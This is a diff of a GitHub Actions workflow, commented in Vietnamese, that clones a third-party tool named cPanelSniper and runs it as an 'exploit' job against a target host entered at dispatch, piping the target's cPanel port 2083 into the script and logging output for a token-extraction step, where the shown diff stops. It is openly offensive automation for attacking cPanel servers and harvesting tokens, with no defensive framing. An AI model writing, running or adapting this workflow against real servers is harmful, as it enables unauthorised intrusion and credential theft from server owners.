@@ -1,4 +1,4 @@
-name: Test cPanelSniper – Get Token
+name: Test cPanelSniper (Auto-Clone)
 
 on:
   workflow_dispatch:
@@ -10,26 +10,33 @@ on:
         type: string
 
 jobs:
-  scan:
+  exploit:
     runs-on: ubuntu-latest
     steps:
-      - name: Checkout code
+      # Bước 1: Clone repository CỦA BẠN (nơi chứa workflow này)
+      - name: Checkout your repo
         uses: actions/checkout@v4
+
+      # Bước 2: Clone công cụ cPanelSniper từ repo gốc
+      - name: Clone cPanelSniper
+        run: |
+          git clone https://github.com/ynsmroztas/cPanelSniper.git
+          # Sao chép file script vào thư mục gốc để dễ sử dụng
+          cp cPanelSniper/cPanelSniper.py .
 
       - name: Setup Python
         uses: actions/setup-python@v5
         with:
           python-version: '3.10'
 
-      - name: Install requests
-        run: pip install requests
+      # Lưu ý: Script này không cần cài thêm thư viện (Pure Python stdlib)[reference:3]
+      - name: Show help (kiểm tra script hoạt động)
+        run: python cPanelSniper.py -h
 
       - name: Run exploit on port 2083
-        id: exploit
         run: |
           echo "🔍 Target: https://${{ github.event.inputs.target }}:2083"
           echo "https://${{ github.event.inputs.target }}:2083" | python cPanelSniper.py 2>&1 | tee output.log
-          echo "::set-output name=log::$(cat output.log)"
 
       - name: Extract token and show summary
         run: |
